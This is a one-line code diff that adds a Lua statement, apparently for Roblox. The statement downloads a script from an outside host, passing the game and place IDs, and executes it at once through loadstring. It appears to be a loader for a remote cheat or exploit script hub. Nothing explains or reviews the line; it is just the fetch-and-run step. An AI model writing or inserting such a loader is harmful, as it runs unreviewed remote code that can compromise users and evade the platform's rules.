@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://triangulare.xyz/loader?g="..game.GameId.."&p="..game.PlaceId))()
